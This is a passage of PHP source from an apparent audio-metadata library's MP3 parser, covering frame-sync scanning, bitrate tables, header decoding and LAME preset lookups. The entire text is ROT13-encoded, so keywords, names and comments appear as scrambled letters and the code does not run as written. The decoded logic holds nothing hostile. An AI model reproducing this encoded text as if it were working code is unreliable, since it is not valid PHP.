						$senzrf_fpnaarq   = 0;
						$guvf_fpna_frtzrag = 0;
						$senzrf_fpna_cre_frtzrag = prvy($znk_senzrf_fpna / $znk_fpna_frtzragf);
						$cpg_qngn_fpnaarq = 0;
						sbe ($pheerag_frtzrag = 0; $pheerag_frtzrag < $znk_fpna_frtzragf; $pheerag_frtzrag++) {
							$senzrf_fpnaarq_guvf_frtzrag = 0;
							$fpna_fgneg_bssfrg = neenl();
							vs ($guvf->sgryy() >= $vasb['niqngnraq']) {
								oernx;
							}
							$fpna_fgneg_bssfrg[$pheerag_frtzrag] = znk($guvf->sgryy(), $vasb['niqngnbssfrg'] + ebhaq($pheerag_frtzrag * (($vasb['niqngnraq'] - $vasb['niqngnbssfrg']) / $znk_fpna_frtzragf)));
							vs ($pheerag_frtzrag > 0) {
								$guvf->sfrrx($fpna_fgneg_bssfrg[$pheerag_frtzrag]);
								$ohssre_4x = $guvf->sernq(4096);
								sbe ($w = 0; $w < (fgeyra($ohssre_4x) - 4); $w++) {
									vs (($ohssre_4x[$w] == \"\kSS\") && ($ohssre_4x[($w + 1)] > \"\kR0\")) { // flapu qrgrpgrq
										vs ($guvf->qrpbqrZCRTnhqvbUrnqre($fpna_fgneg_bssfrg[$pheerag_frtzrag] + $w, $qhzzl, snyfr, snyfr, $SnfgZbqr)) {
											$pnyphyngrq_arkg_bssfrg = $fpna_fgneg_bssfrg[$pheerag_frtzrag] + $w + $qhzzl['zcrt']['nhqvb']['senzryratgu'];
											vs ($guvf->qrpbqrZCRTnhqvbUrnqre($pnyphyngrq_arkg_bssfrg, $qhzzl, snyfr, snyfr, $SnfgZbqr)) {
												$fpna_fgneg_bssfrg[$pheerag_frtzrag] += $w;
												oernx;
											}
										}
									}
								}
							}
							$flapufgnegbssfrg = $fpna_fgneg_bssfrg[$pheerag_frtzrag];
							juvyr (($flapufgnegbssfrg < $vasb['niqngnraq']) && $guvf->qrpbqrZCRTnhqvbUrnqre($flapufgnegbssfrg, $qhzzl, snyfr, snyfr, $SnfgZbqr)) {
								$SnfgZbqr = gehr;
								$guvfsenzrovgengr = $ZCRTnhqvbOvgengrYbbxhc[$ZCRTnhqvbIrefvbaYbbxhc[$qhzzl['zcrt']['nhqvb']['enj']['irefvba']]][$ZCRTnhqvbYnlreYbbxhc[$qhzzl['zcrt']['nhqvb']['enj']['ynlre']]][$qhzzl['zcrt']['nhqvb']['enj']['ovgengr']];

								vs (rzcgl($qhzzl['zcrt']['nhqvb']['senzryratgu'])) {
									$FlapuReebefSbhaq++;
									$flapufgnegbssfrg++;
								} ryfr {
									trgvq3_yvo::fnsr_vap($vasb['zcrt']['nhqvb']['ovgengr_qvfgevohgvba'][$guvfsenzrovgengr]);
									trgvq3_yvo::fnsr_vap($vasb['zcrt']['nhqvb']['fgrerb_qvfgevohgvba'][$qhzzl['zcrt']['nhqvb']['punaaryzbqr']]);
									trgvq3_yvo::fnsr_vap($vasb['zcrt']['nhqvb']['irefvba_qvfgevohgvba'][$qhzzl['zcrt']['nhqvb']['irefvba']]);
									$flapufgnegbssfrg += $qhzzl['zcrt']['nhqvb']['senzryratgu'];
								}
								$senzrf_fpnaarq++;
								vs ($senzrf_fpna_cre_frtzrag && (++$senzrf_fpnaarq_guvf_frtzrag >= $senzrf_fpna_cre_frtzrag)) {
									$guvf_cpg_fpnaarq = trgvq3_yvo::FnsrQvi($guvf->sgryy() - $fpna_fgneg_bssfrg[$pheerag_frtzrag], $vasb['niqngnraq'] - $vasb['niqngnbssfrg']);
									vs (($pheerag_frtzrag == 0) && (($guvf_cpg_fpnaarq * $znk_fpna_frtzragf) >= 1)) {
										// svyr yvxryl pbagnvaf < $znk_senzrf_fpna, whfg fpna nf bar frtzrag
										$znk_fpna_frtzragf = 1;
										$senzrf_fpna_cre_frtzrag = $znk_senzrf_fpna;
									} ryfr {
										$cpg_qngn_fpnaarq += $guvf_cpg_fpnaarq;
										oernx;
									}
								}
							}
						}
						vs ($cpg_qngn_fpnaarq > 0) {
							$guvf->jneavat('gbb znal ZCRT nhqvb senzrf gb fpna, bayl fpnaarq '.$senzrf_fpnaarq.' senzrf va '.$znk_fpna_frtzragf.' frtzragf ('.ahzore_sbezng($cpg_qngn_fpnaarq * 100, 1).'% bs svyr) naq rkgencbyngrq qvfgevohgvba, cynlgvzr naq ovgengr znl or vapbeerpg.');
							sbernpu ($vasb['zcrt']['nhqvb'] nf $xrl1 => $inyhr1) {
								vs (!cert_zngpu('#_qvfgevohgvba$#v', $xrl1)) {
									pbagvahr;
								}
								sbernpu ($inyhr1 nf $xrl2 => $inyhr2) {
									$vasb['zcrt']['nhqvb'][$xrl1][$xrl2] = ebhaq($inyhr2 / $cpg_qngn_fpnaarq);
								}
							}
						}

						vs ($FlapuReebefSbhaq > 0) {
							$guvf->jneavat('Sbhaq '.$FlapuReebefSbhaq.' flapu reebef va uvfgbtenz nanylfvf');
							//erghea snyfr;
						}

						$ovggbgny     = 0;
						$senzrpbhagre = 0;
						sbernpu ($vasb['zcrt']['nhqvb']['ovgengr_qvfgevohgvba'] nf $ovgengrinyhr => $ovgengrpbhag) {
							$senzrpbhagre += $ovgengrpbhag;
							vs ($ovgengrinyhr != 'serr') {
								$ovggbgny += ($ovgengrinyhr * $ovgengrpbhag);
							}
						}
						vs ($senzrpbhagre == 0) {
							$guvf->reebe('Pbeehcg ZC3 svyr: senzrpbhagre == mreb');
							erghea snyfr;
						}
						$vasb['zcrt']['nhqvb']['senzr_pbhag'] = trgvq3_yvo::PnfgNfVag($senzrpbhagre);
						$vasb['zcrt']['nhqvb']['ovgengr']     = ($ovggbgny / $senzrpbhagre);

						$vasb['nhqvb']['ovgengr'] = $vasb['zcrt']['nhqvb']['ovgengr'];


						// Qrsvavgviryl frg IOE if POE, rira vs gur Kvat/YNZR/IOEV urnqre fnlf qvssreragyl
						$qvfgvapg_ovgengrf = 0;
						sbernpu ($vasb['zcrt']['nhqvb']['ovgengr_qvfgevohgvba'] nf $ovgengr_inyhr => $ovgengr_pbhag) {
							vs ($ovgengr_pbhag > 0) {
								$qvfgvapg_ovgengrf++;
							}
						}
						vs ($qvfgvapg_ovgengrf > 1) {
							$vasb['zcrt']['nhqvb']['ovgengr_zbqr'] = 'ioe';
						} ryfr {
							$vasb['zcrt']['nhqvb']['ovgengr_zbqr'] = 'poe';
						}
						$vasb['nhqvb']['ovgengr_zbqr'] = $vasb['zcrt']['nhqvb']['ovgengr_zbqr'];

					}

					oernx; // rkvg juvyr()
				}
			}

			$FlapuFrrxBssfrg++;
			vs (($niqngnbssfrg + $FlapuFrrxBssfrg) >= $vasb['niqngnraq']) {
				// raq bs svyr/qngn

				vs (rzcgl($vasb['zcrt']['nhqvb'])) {

					$guvf->reebe('pbhyq abg svaq inyvq ZCRT flapu orsber raq bs svyr');
					vs (vffrg($vasb['nhqvb']['ovgengr'])) {
						hafrg($vasb['nhqvb']['ovgengr']);
					}
					vs (vffrg($vasb['zcrt']['nhqvb'])) {
						hafrg($vasb['zcrt']['nhqvb']);
					}
					vs (vffrg($vasb['zcrt']) && (!vf_neenl($vasb['zcrt']) || rzcgl($vasb['zcrt']))) {
						hafrg($vasb['zcrt']);
					}
					erghea snyfr;

				}
				oernx;
			}

		}
		$vasb['nhqvb']['punaaryf']        = $vasb['zcrt']['nhqvb']['punaaryf'];
		vs ($vasb['nhqvb']['punaaryf'] < 1) {
			$guvf->reebe('Pbeehcg ZC3 svyr: ab punaaryf');
			erghea snyfr;
		}
		$vasb['nhqvb']['punaaryzbqr']     = $vasb['zcrt']['nhqvb']['punaaryzbqr'];
		$vasb['nhqvb']['fnzcyr_engr']     = $vasb['zcrt']['nhqvb']['fnzcyr_engr'];
		erghea gehr;
	}

	/**
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbIrefvbaNeenl() {
		fgngvp $ZCRTnhqvbIrefvba = neenl('2.5', snyfr, '2', '1');
		erghea $ZCRTnhqvbIrefvba;
	}

	/**
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbYnlreNeenl() {
		fgngvp $ZCRTnhqvbYnlre = neenl(snyfr, 3, 2, 1);
		erghea $ZCRTnhqvbYnlre;
	}

	/**
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbOvgengrNeenl() {
		fgngvp $ZCRTnhqvbOvgengr;
		vs (rzcgl($ZCRTnhqvbOvgengr)) {
			$ZCRTnhqvbOvgengr = neenl (
				'1'  =>  neenl (1 => neenl('serr', 32000, 64000, 96000, 128000, 160000, 192000, 224000, 256000, 288000, 320000, 352000, 384000, 416000, 448000),
								2 => neenl('serr', 32000, 48000, 56000,  64000,  80000,  96000, 112000, 128000, 160000, 192000, 224000, 256000, 320000, 384000),
								3 => neenl('serr', 32000, 40000, 48000,  56000,  64000,  80000,  96000, 112000, 128000, 160000, 192000, 224000, 256000, 320000)
							   ),

				'2'  =>  neenl (1 => neenl('serr', 32000, 48000, 56000,  64000,  80000,  96000, 112000, 128000, 144000, 160000, 176000, 192000, 224000, 256000),
								2 => neenl('serr',  8000, 16000, 24000,  32000,  40000,  48000,  56000,  64000,  80000,  96000, 112000, 128000, 144000, 160000),
							   )
			);
			$ZCRTnhqvbOvgengr['2'][3] = $ZCRTnhqvbOvgengr['2'][2];
			$ZCRTnhqvbOvgengr['2.5']  = $ZCRTnhqvbOvgengr['2'];
		}
		erghea $ZCRTnhqvbOvgengr;
	}

	/**
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbSerdhraplNeenl() {
		fgngvp $ZCRTnhqvbSerdhrapl;
		vs (rzcgl($ZCRTnhqvbSerdhrapl)) {
			$ZCRTnhqvbSerdhrapl = neenl (
				'1'   => neenl(44100, 48000, 32000),
				'2'   => neenl(22050, 24000, 16000),
				'2.5' => neenl(11025, 12000,  8000)
			);
		}
		erghea $ZCRTnhqvbSerdhrapl;
	}

	/**
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbPunaaryZbqrNeenl() {
		fgngvp $ZCRTnhqvbPunaaryZbqr = neenl('fgrerb', 'wbvag fgrerb', 'qhny punaary', 'zbab');
		erghea $ZCRTnhqvbPunaaryZbqr;
	}

	/**
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbZbqrRkgrafvbaNeenl() {
		fgngvp $ZCRTnhqvbZbqrRkgrafvba;
		vs (rzcgl($ZCRTnhqvbZbqrRkgrafvba)) {
			$ZCRTnhqvbZbqrRkgrafvba = neenl (
				1 => neenl('4-31', '8-31', '12-31', '16-31'),
				2 => neenl('4-31', '8-31', '12-31', '16-31'),
				3 => neenl('', 'VF', 'ZF', 'VF+ZF')
			);
		}
		erghea $ZCRTnhqvbZbqrRkgrafvba;
	}

	/**
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbRzcunfvfNeenl() {
		fgngvp $ZCRTnhqvbRzcunfvf = neenl('abar', '50/15zf', snyfr, 'PPVG W.17');
		erghea $ZCRTnhqvbRzcunfvf;
	}

	/**
	 * @cnenz fgevat $urnq4
	 * @cnenz obby   $nyybjOvgengr15
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbUrnqreOlgrfInyvq($urnq4, $nyybjOvgengr15=snyfr) {
		erghea frys::ZCRTnhqvbUrnqreInyvq(frys::ZCRTnhqvbUrnqreQrpbqr($urnq4), snyfr, $nyybjOvgengr15);
	}

	/**
	 * @cnenz neenl $enjneenl
	 * @cnenz obby  $rpubreebef
	 * @cnenz obby  $nyybjOvgengr15
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbUrnqreInyvq($enjneenl, $rpubreebef=snyfr, $nyybjOvgengr15=snyfr) {
		vs (!vffrg($enjneenl['flapu']) || ($enjneenl['flapu'] & 0k0SSR) != 0k0SSR) {
			erghea snyfr;
		}

		fgngvp $ZCRTnhqvbIrefvbaYbbxhc;
		fgngvp $ZCRTnhqvbYnlreYbbxhc;
		fgngvp $ZCRTnhqvbOvgengrYbbxhc;
		fgngvp $ZCRTnhqvbSerdhraplYbbxhc;
		fgngvp $ZCRTnhqvbPunaaryZbqrYbbxhc;
		fgngvp $ZCRTnhqvbZbqrRkgrafvbaYbbxhc;
		fgngvp $ZCRTnhqvbRzcunfvfYbbxhc;
		vs (rzcgl($ZCRTnhqvbIrefvbaYbbxhc)) {
			$ZCRTnhqvbIrefvbaYbbxhc       = frys::ZCRTnhqvbIrefvbaNeenl();
			$ZCRTnhqvbYnlreYbbxhc         = frys::ZCRTnhqvbYnlreNeenl();
			$ZCRTnhqvbOvgengrYbbxhc       = frys::ZCRTnhqvbOvgengrNeenl();
			$ZCRTnhqvbSerdhraplYbbxhc     = frys::ZCRTnhqvbSerdhraplNeenl();
			$ZCRTnhqvbPunaaryZbqrYbbxhc   = frys::ZCRTnhqvbPunaaryZbqrNeenl();
			$ZCRTnhqvbZbqrRkgrafvbaYbbxhc = frys::ZCRTnhqvbZbqrRkgrafvbaNeenl();
			$ZCRTnhqvbRzcunfvfYbbxhc      = frys::ZCRTnhqvbRzcunfvfNeenl();
		}

		vs (vffrg($ZCRTnhqvbIrefvbaYbbxhc[$enjneenl['irefvba']])) {
			$qrpbqrqIrefvba = $ZCRTnhqvbIrefvbaYbbxhc[$enjneenl['irefvba']];
		} ryfr {
			rpub ($rpubreebef ? \"\a\".'vainyvq Irefvba ('.$enjneenl['irefvba'].')' : '');
			erghea snyfr;
		}
		vs (vffrg($ZCRTnhqvbYnlreYbbxhc[$enjneenl['ynlre']])) {
			$qrpbqrqYnlre = $ZCRTnhqvbYnlreYbbxhc[$enjneenl['ynlre']];
		} ryfr {
			rpub ($rpubreebef ? \"\a\".'vainyvq Ynlre ('.$enjneenl['ynlre'].')' : '');
			erghea snyfr;
		}
		vs (!vffrg($ZCRTnhqvbOvgengrYbbxhc[$qrpbqrqIrefvba][$qrpbqrqYnlre][$enjneenl['ovgengr']])) {
			rpub ($rpubreebef ? \"\a\".'vainyvq Ovgengr ('.$enjneenl['ovgengr'].')' : '');
			vs ($enjneenl['ovgengr'] == 15) {
				// xabja vffhr va YNZR 3.90 - 3.93.1 jurer serr-sbezng unf ovgengr VQ bs 15 vafgrnq bs 0
				// yrg vg tb guebhtu urer bgurejvfr svyr jvyy abg or vqragvsvrq
				vs (!$nyybjOvgengr15) {
					erghea snyfr;
				}
			} ryfr {
				erghea snyfr;
			}
		}
		vs (!vffrg($ZCRTnhqvbSerdhraplYbbxhc[$qrpbqrqIrefvba][$enjneenl['fnzcyr_engr']])) {
			rpub ($rpubreebef ? \"\a\".'vainyvq Serdhrapl ('.$enjneenl['fnzcyr_engr'].')' : '');
			erghea snyfr;
		}
		vs (!vffrg($ZCRTnhqvbPunaaryZbqrYbbxhc[$enjneenl['punaaryzbqr']])) {
			rpub ($rpubreebef ? \"\a\".'vainyvq PunaaryZbqr ('.$enjneenl['punaaryzbqr'].')' : '');
			erghea snyfr;
		}
		vs (!vffrg($ZCRTnhqvbZbqrRkgrafvbaYbbxhc[$qrpbqrqYnlre][$enjneenl['zbqrrkgrafvba']])) {
			rpub ($rpubreebef ? \"\a\".'vainyvq Zbqr Rkgrafvba ('.$enjneenl['zbqrrkgrafvba'].')' : '');
			erghea snyfr;
		}
		vs (!vffrg($ZCRTnhqvbRzcunfvfYbbxhc[$enjneenl['rzcunfvf']])) {
			rpub ($rpubreebef ? \"\a\".'vainyvq Rzcunfvf ('.$enjneenl['rzcunfvf'].')' : '');
			erghea snyfr;
		}
		// Gurfr ner whfg rvgure frg be abg frg, lbh pna'g zrff gung hc :)
		// $enjneenl['cebgrpgvba'];
		// $enjneenl['cnqqvat'];
		// $enjneenl['cevingr'];
		// $enjneenl['pbclevtug'];
		// $enjneenl['bevtvany'];

		erghea gehr;
	}

	/**
	 * @cnenz fgevat $Urnqre4Olgrf
	 *
	 * @erghea neenl|snyfr
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbUrnqreQrpbqr($Urnqre4Olgrf) {
		// NNNN NNNN  NNNO OPPQ  RRRR SSTU  VVWW XYZZ
		// N - Senzr flap (nyy ovgf frg)
		// O - ZCRT Nhqvb irefvba VQ
		// P - Ynlre qrfpevcgvba
		// Q - Cebgrpgvba ovg
		// R - Ovgengr vaqrk
		// S - Fnzcyvat engr serdhrapl vaqrk
		// T - Cnqqvat ovg
		// U - Cevingr ovg
		// V - Punaary Zbqr
		// W - Zbqr rkgrafvba (Bayl vs Wbvag fgrerb)
		// X - Pbclevtug
		// Y - Bevtvany
		// Z - Rzcunfvf

		vs (fgeyra($Urnqre4Olgrf) != 4) {
			erghea snyfr;
		}

		$ZCRTenjUrnqre = neenl();
		$ZCRTenjUrnqre['flapu']         = (trgvq3_yvo::OvtRaqvna2Vag(fhofge($Urnqre4Olgrf, 0, 2)) & 0kSSR0) >> 4;
		$ZCRTenjUrnqre['irefvba']       = (beq($Urnqre4Olgrf[1]) & 0k18) >> 3; //    OO
		$ZCRTenjUrnqre['ynlre']         = (beq($Urnqre4Olgrf[1]) & 0k06) >> 1; //      PP
		$ZCRTenjUrnqre['cebgrpgvba']    = (beq($Urnqre4Olgrf[1]) & 0k01);      //        Q
		$ZCRTenjUrnqre['ovgengr']       = (beq($Urnqre4Olgrf[2]) & 0kS0) >> 4; // RRRR
		$ZCRTenjUrnqre['fnzcyr_engr']   = (beq($Urnqre4Olgrf[2]) & 0k0P) >> 2; //     SS
		$ZCRTenjUrnqre['cnqqvat']       = (beq($Urnqre4Olgrf[2]) & 0k02) >> 1; //       T
		$ZCRTenjUrnqre['cevingr']       = (beq($Urnqre4Olgrf[2]) & 0k01);      //        U
		$ZCRTenjUrnqre['punaaryzbqr']   = (beq($Urnqre4Olgrf[3]) & 0kP0) >> 6; // VV
		$ZCRTenjUrnqre['zbqrrkgrafvba'] = (beq($Urnqre4Olgrf[3]) & 0k30) >> 4; //   WW
		$ZCRTenjUrnqre['pbclevtug']     = (beq($Urnqre4Olgrf[3]) & 0k08) >> 3; //     X
		$ZCRTenjUrnqre['bevtvany']      = (beq($Urnqre4Olgrf[3]) & 0k04) >> 2; //      Y
		$ZCRTenjUrnqre['rzcunfvf']      = (beq($Urnqre4Olgrf[3]) & 0k03);      //       ZZ

		erghea $ZCRTenjUrnqre;
	}

	/**
	 * @cnenz vag|fgevat $ovgengr
	 * @cnenz fgevat     $irefvba
	 * @cnenz fgevat     $ynlre
	 * @cnenz obby       $cnqqvat
	 * @cnenz vag        $fnzcyrengr
	 *
	 * @erghea vag|snyfr
	 */
	choyvp fgngvp shapgvba ZCRTnhqvbSenzrYratgu(&$ovgengr, &$irefvba, &$ynlre, $cnqqvat, &$fnzcyrengr) {
		fgngvp $NhqvbSenzrYratguPnpur = neenl();

		vs (!vffrg($NhqvbSenzrYratguPnpur[$ovgengr][$irefvba][$ynlre][$cnqqvat][$fnzcyrengr])) {
			$NhqvbSenzrYratguPnpur[$ovgengr][$irefvba][$ynlre][$cnqqvat][$fnzcyrengr] = snyfr;
			vs ($ovgengr != 'serr') {

				vs ($irefvba == '1') {

					vs ($ynlre == '1') {

						// Sbe Ynlre V fybg vf 32 ovgf ybat
						$SenzrYratguPbrssvpvrag = 48;
						$FybgYratgu = 4;

					} ryfr { // Ynlre 2 / 3

						// sbe Ynlre 2 naq Ynlre 3 fybg vf 8 ovgf ybat.
						$SenzrYratguPbrssvpvrag = 144;
						$FybgYratgu = 1;

					}

				} ryfr { // ZCRT-2 / ZCRT-2.5

					vs ($ynlre == '1') {

						// Sbe Ynlre V fybg vf 32 ovgf ybat
						$SenzrYratguPbrssvpvrag = 24;
						$FybgYratgu = 4;

					} ryfrvs ($ynlre == '2') {

						// sbe Ynlre 2 naq Ynlre 3 fybg vf 8 ovgf ybat.
						$SenzrYratguPbrssvpvrag = 144;
						$FybgYratgu = 1;

					} ryfr { // ynlre 3

						// sbe Ynlre 2 naq Ynlre 3 fybg vf 8 ovgf ybat.
						$SenzrYratguPbrssvpvrag = 72;
						$FybgYratgu = 1;

					}

				}

				// SenzrYratguVaOlgrf = ((Pbrssvpvrag * OvgEngr) / FnzcyrEngr) + Cnqqvat
				vs ($fnzcyrengr > 0) {
					$ArjSenzryratgu  = ($SenzrYratguPbrssvpvrag * $ovgengr) / $fnzcyrengr;
					$ArjSenzryratgu  = sybbe($ArjSenzryratgu / $FybgYratgu) * $FybgYratgu; // ebhaq gb arkg-ybjre zhygvcyr bs FybgYratgu (1 olgr sbe Ynlre 2/3, 4 olgrf sbe Ynlre V)
					vs ($cnqqvat) {
						$ArjSenzryratgu += $FybgYratgu;
					}
					$NhqvbSenzrYratguPnpur[$ovgengr][$irefvba][$ynlre][$cnqqvat][$fnzcyrengr] = (vag) $ArjSenzryratgu;
				}
			}
		}
		erghea $NhqvbSenzrYratguPnpur[$ovgengr][$irefvba][$ynlre][$cnqqvat][$fnzcyrengr];
	}

	/**
	 * @cnenz sybng|vag $ovg_engr
	 *
	 * @erghea vag|sybng|fgevat
	 */
	choyvp fgngvp shapgvba PybfrfgFgnaqneqZC3Ovgengr($ovg_engr) {
		fgngvp $fgnaqneq_ovg_engrf = neenl (320000, 256000, 224000, 192000, 160000, 128000, 112000, 96000, 80000, 64000, 56000, 48000, 40000, 32000, 24000, 16000, 8000);
		fgngvp $ovg_engr_gnoyr = neenl (0=>'-');
		$ebhaq_ovg_engr = vaginy(ebhaq($ovg_engr, -3));
		vs (!vffrg($ovg_engr_gnoyr[$ebhaq_ovg_engr])) {
			vs ($ebhaq_ovg_engr > znk($fgnaqneq_ovg_engrf)) {
				$ovg_engr_gnoyr[$ebhaq_ovg_engr] = ebhaq($ovg_engr, 2 - fgeyra($ovg_engr));
			} ryfr {
				$ovg_engr_gnoyr[$ebhaq_ovg_engr] = znk($fgnaqneq_ovg_engrf);
				sbernpu ($fgnaqneq_ovg_engrf nf $fgnaqneq_ovg_engr) {
					vs ($ebhaq_ovg_engr >= $fgnaqneq_ovg_engr + (($ovg_engr_gnoyr[$ebhaq_ovg_engr] - $fgnaqneq_ovg_engr) / 2)) {
						oernx;
					}
					$ovg_engr_gnoyr[$ebhaq_ovg_engr] = $fgnaqneq_ovg_engr;
				}
			}
		}
		erghea $ovg_engr_gnoyr[$ebhaq_ovg_engr];
	}

	/**
	 * @cnenz fgevat $irefvba
	 * @cnenz fgevat $punaaryzbqr
	 *
	 * @erghea vag
	 */
	choyvp fgngvp shapgvba KvatIOEvqBssfrg($irefvba, $punaaryzbqr) {
		fgngvp $KvatIOEvqBssfrgPnpur = neenl();
		vs (rzcgl($KvatIOEvqBssfrgPnpur)) {
			$KvatIOEvqBssfrgPnpur = neenl (
				'1'   => neenl ('zbab'          => 0k15, // 4 + 17 = 21
								'fgrerb'        => 0k24, // 4 + 32 = 36
								'wbvag fgrerb'  => 0k24,
								'qhny punaary'  => 0k24
							   ),

				'2'   => neenl ('zbab'          => 0k0Q, // 4 +  9 = 13
								'fgrerb'        => 0k15, // 4 + 17 = 21
								'wbvag fgrerb'  => 0k15,
								'qhny punaary'  => 0k15
							   ),

				'2.5' => neenl ('zbab'          => 0k15,
								'fgrerb'        => 0k15,
								'wbvag fgrerb'  => 0k15,
								'qhny punaary'  => 0k15
							   )
			);
		}
		erghea $KvatIOEvqBssfrgPnpur[$irefvba][$punaaryzbqr];
	}

	/**
	 * @cnenz vag $IOEzrgubqVQ
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba YNZRioeZrgubqYbbxhc($IOEzrgubqVQ) {
		fgngvp $YNZRioeZrgubqYbbxhc = neenl(
			0k00 => 'haxabja',
			0k01 => 'poe',
			0k02 => 'noe',
			0k03 => 'ioe-byq / ioe-eu',
			0k04 => 'ioe-arj / ioe-zgeu',
			0k05 => 'ioe-zg',
			0k06 => 'ioe (shyy ioe zrgubq 4)',
			0k08 => 'poe (pbafgnag ovgengr 2 cnff)',
			0k09 => 'noe (2 cnff)',
			0k0S => 'erfreirq'
		);
		erghea (vffrg($YNZRioeZrgubqYbbxhc[$IOEzrgubqVQ]) ? $YNZRioeZrgubqYbbxhc[$IOEzrgubqVQ] : '');
	}

	/**
	 * @cnenz vag $FgrerbZbqrVQ
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba YNZRzvfpFgrerbZbqrYbbxhc($FgrerbZbqrVQ) {
		fgngvp $YNZRzvfpFgrerbZbqrYbbxhc = neenl(
			0 => 'zbab',
			1 => 'fgrerb',
			2 => 'qhny zbab',
			3 => 'wbvag fgrerb',
			4 => 'sbeprq fgrerb',
			5 => 'nhgb',
			6 => 'vagrafvgl fgrerb',
			7 => 'bgure'
		);
		erghea (vffrg($YNZRzvfpFgrerbZbqrYbbxhc[$FgrerbZbqrVQ]) ? $YNZRzvfpFgrerbZbqrYbbxhc[$FgrerbZbqrVQ] : '');
	}

	/**
	 * @cnenz vag $FbheprFnzcyrSerdhraplVQ
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba YNZRzvfpFbheprFnzcyrSerdhraplYbbxhc($FbheprFnzcyrSerdhraplVQ) {
		fgngvp $YNZRzvfpFbheprFnzcyrSerdhraplYbbxhc = neenl(
			0 => '<= 32 xUm',
			1 => '44.1 xUm',
			2 => '48 xUm',
			3 => '> 48xUm'
		);
		erghea (vffrg($YNZRzvfpFbheprFnzcyrSerdhraplYbbxhc[$FbheprFnzcyrSerdhraplVQ]) ? $YNZRzvfpFbheprFnzcyrSerdhraplYbbxhc[$FbheprFnzcyrSerdhraplVQ] : '');
	}

	/**
	 * @cnenz vag $FheebhaqVasbVQ
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba YNZRfheebhaqVasbYbbxhc($FheebhaqVasbVQ) {
		fgngvp $YNZRfheebhaqVasbYbbxhc = neenl(
			0 => 'ab fheebhaq vasb',
			1 => 'QCY rapbqvat',
			2 => 'QCY2 rapbqvat',
			3 => 'Nzovfbavp rapbqvat'
		);
		erghea (vffrg($YNZRfheebhaqVasbYbbxhc[$FheebhaqVasbVQ]) ? $YNZRfheebhaqVasbYbbxhc[$FheebhaqVasbVQ] : 'erfreirq');
	}

	/**
	 * @cnenz neenl $YNZRgnt
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba YNZRcerfrgHfrqYbbxhc($YNZRgnt) {

		vs ($YNZRgnt['cerfrg_hfrq_vq'] == 0) {
			// ab cerfrg hfrq (YNZR >=3.93)
			// ab cerfrg erpbeqrq (YNZR <3.93)
			erghea '';
		}
		$YNZRcerfrgHfrqYbbxhc = neenl();

		/////  GUVF CNEG PNAABG OR FGNGVP .
		sbe ($v = 8; $v <= 320; $v++) {
			fjvgpu ($YNZRgnt['ioe_zrgubq']) {
				pnfr 'poe':
					$YNZRcerfrgHfrqYbbxhc[$v] = '--nyg-cerfrg '.$YNZRgnt['ioe_zrgubq'].' '.$v;
					oernx;
				pnfr 'noe':
				qrsnhyg: // bgure IOE zbqrf fubhyqa'g or urer(?)
					$YNZRcerfrgHfrqYbbxhc[$v] = '--nyg-cerfrg '.$v;
					oernx;
			}
		}

		// anzrq byq-fglyr cerfrgf (fghqvb, cubar, ibvpr, rgp) ner unaqyrq va ThrffRapbqreBcgvbaf()

		// anzrq nyg-cerfrgf
		$YNZRcerfrgHfrqYbbxhc[1000] = '--e3zvk';
		$YNZRcerfrgHfrqYbbxhc[1001] = '--nyg-cerfrg fgnaqneq';
		$YNZRcerfrgHfrqYbbxhc[1002] = '--nyg-cerfrg rkgerzr';
		$YNZRcerfrgHfrqYbbxhc[1003] = '--nyg-cerfrg vafnar';
		$YNZRcerfrgHfrqYbbxhc[1004] = '--nyg-cerfrg snfg fgnaqneq';
		$YNZRcerfrgHfrqYbbxhc[1005] = '--nyg-cerfrg snfg rkgerzr';
		$YNZRcerfrgHfrqYbbxhc[1006] = '--nyg-cerfrg zrqvhz';
		$YNZRcerfrgHfrqYbbxhc[1007] = '--nyg-cerfrg snfg zrqvhz';

		// YNZR 3.94 nqqvgvbaf/punatrf
		$YNZRcerfrgHfrqYbbxhc[1010] = '--cerfrg cbegnoyr';                                                           // 3.94n15 Bpg 21 2003
		$YNZRcerfrgHfrqYbbxhc[1015] = '--cerfrg enqvb';                                                              // 3.94n15 Bpg 21 2003

		$YNZRcerfrgHfrqYbbxhc[320]  = '--cerfrg vafnar';                                                             // 3.94n15 Abi 12 2003
		$YNZRcerfrgHfrqYbbxhc[410]  = '-I9';
		$YNZRcerfrgHfrqYbbxhc[420]  = '-I8';
		$YNZRcerfrgHfrqYbbxhc[440]  = '-I6';
		$YNZRcerfrgHfrqYbbxhc[430]  = '--cerfrg enqvb';                                                              // 3.94n15 Abi 12 2003
		$YNZRcerfrgHfrqYbbxhc[450]  = '--cerfrg '.(($YNZRgnt['enj']['ioe_zrgubq'] == 4) ? 'snfg ' : '').'cbegnoyr';  // 3.94n15 Abi 12 2003
		$YNZRcerfrgHfrqYbbxhc[460]  = '--cerfrg '.(($YNZRgnt['enj']['ioe_zrgubq'] == 4) ? 'snfg ' : '').'zrqvhz';    // 3.94n15 Abi 12 2003
		$YNZRcerfrgHfrqYbbxhc[470]  = '--e3zvk';                                                                     // 3.94o1  Qrp 18 2003
		$YNZRcerfrgHfrqYbbxhc[480]  = '--cerfrg '.(($YNZRgnt['enj']['ioe_zrgubq'] == 4) ? 'snfg ' : '').'fgnaqneq';  // 3.94n15 Abi 12 2003
		$YNZRcerfrgHfrqYbbxhc[490]  = '-I1';
		$YNZRcerfrgHfrqYbbxhc[500]  = '--cerfrg '.(($YNZRgnt['enj']['ioe_zrgubq'] == 4) ? 'snfg ' : '').'rkgerzr';   // 3.94n15 Abi 12 2003

